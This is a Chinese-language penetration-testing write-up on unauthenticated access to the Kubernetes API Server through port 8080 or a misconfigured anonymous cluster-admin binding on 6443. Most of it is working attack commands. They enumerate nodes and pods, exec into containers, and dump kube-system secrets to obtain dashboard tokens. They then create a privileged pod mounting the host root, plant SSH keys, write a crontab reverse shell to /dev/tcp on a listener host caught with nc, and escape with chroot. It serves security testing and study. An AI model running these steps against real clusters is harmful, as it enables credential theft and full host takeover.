# K8s API Server未授权命令执行

## 漏洞描述

Kubernetes是一个可以移植、可扩展的开源平台，使用 声明式的配置 并依据配置信息自动地执行容器化应用程序的管理。在所有的容器编排工具中（类似的还有 docker swarm / mesos等），Kubernetes的生态系统更大、增长更快，有更多的支持、服务和工具可供用户选择。

K8s 的API Server默认服务端口为8080(insecure-port)和6443(secure-port)，8080端口提供HTTP服务，没有认证授权机制，而6443端口提供HTTPS服务，支持认证(使用令牌或客户端证书进行认证)和授权服务。默认情况下8080端口不启动，而6443端口启动。这两个端口的开放取决于/etc/kubernetes/manifests/kube-apiserver.yaml配置文件。

如果目标K8s的8080端口开启了，由于其没有认证授权机制，因此存在未授权访问。

如果目标K8s的6443端口开启了，如果配置错误，也可以导致存在未授权访问。

## 漏洞复现

### 8080端口

默认情况下，8080端口关闭的，手动开启：

```
cd /etc/kubernetes/manifests
vim kube-apiserver.yaml
```

高版本的k8s中，将--insecure-port这个配置删除了，因此添加如下两行：

```

- --insecure-port=8080
- --insecure-bind-address=0.0.0.0
```

![image-20230215102911534](images/image-20230215102911534.png)

重启k8s：

```
systemctl restart kubectl
```

访问8080端口即可看到存在未授权：

![image-20230215110103802](images/image-20230215110103802.png)

也可以使用kubectl远程连接获得信息：

```
kubectl -s http://your-vps-ip:8080 get nodes
```

注：在高版本（1.20及其以后）的K8s中直接禁用了该端口，并且无法打开。

### 6443端口

如果运维人员配置不当，将"system:anonymous"用户绑定到"cluster-admin"用户组，则会使得6443端口允许匿名用户以管理员权限访问。

正常情况下访问6443端口，提示Forbidden。

![image-20230215110607076](images/image-20230215110607076.png)

执行如下命令将"system:anonymous"用户绑定到"cluster-admin"用户组：

```
kubectl create clusterrolebinding cluster-system-anonymous --clusterrole=cluster-admin --user=system:anonymous
```

再次访问访问6443端口，即可未授权访问。

## 漏洞利用

### 命令执行

#### 查看k8s集群信息

```
kubectl -s http://your-vps-ip:8080 cluster-info
```

#### 查看node节点信息

```
#查看node节点
kubectl -s http://your-vps-ip:8080 get nodes

#查看node节点详细信息
kubectl -s http://your-vps-ip:8080 get nodes -o wide
```

#### 查看pod节点信息

```
#查看所有的pod
kubectl -s http://your-vps-ip:8080 get pods -A
```

#### 执行其他命令

通过获取到的pods节点信息，进入对应docker 命令执行。-n对应的是NAMESPACE，-it 对应的是NAME：

```
#进入命名空间为default，名字为hello-minikube的容器
kubectl -s http://your-vps-ip:8080 exec -n default -it hello-minikube -- /bin/bash

#进入命名空间为kube-system，名字为etcd-ubuntu的容器
kubectl -s http://your-vps-ip:8080 exec -n kube-system -it etcd-ubuntu -- /bin/sh
```

### 获取Token登录dashboard

访问如下接口，即可看到K8s所有的Token，我们过滤找到dashboard-admin相关的Token。

```
http://your-vps-ip:8080/api/v1/namespaces/kube-system/secrets/

https://your-vps-ip:6443/api/v1/namespaces/kube-system/secrets/
```

然后对其base64解码一次，即可使用base64解码后的Token登录K8s的dashboard。

### 获取宿主机权限

#### 创建pod

通过k8s dashboard，创建特权Pods来获得宿主机权限。登录dashboard后台后，点击右上角+号，然后输入如下命JSON内容，创建名为myapp的pod，并且将宿主机的目录挂在到了/mnt目录下：

```
apiVersion: v1
kind: Pod
metadata:
  name: myapp
spec:
  containers:
  - image: nginx
    name: container
    volumeMounts:
    - mountPath: /mnt
      name: test
  volumes:
  - name: test
    hostPath:
      path: /
```

点击工作负载→Pods，可以看到刚才创建的pod。

点击myapp名称。点击右上角进入Shell窗口。

#### 写入ssh公钥

切换到/mnt/root/.ssh目录下，写入公钥文件，即可免密登录宿主机。

#### 定时任务反弹shell

也可以往宿主机写入crontab来反弹获取shell，执行如下命令，将反弹shell的命令写入/var/spool/cron/root文件中：

```
echo "*/1  *  *  *  *   /bin/bash -i>&/dev/tcp/172.16.200.58/4444 0>&1" > root
```

nc监听接收反弹shell：

```
$ nc -lvp 4444
```

#### chroot逃逸

```
chroot /mnt
```

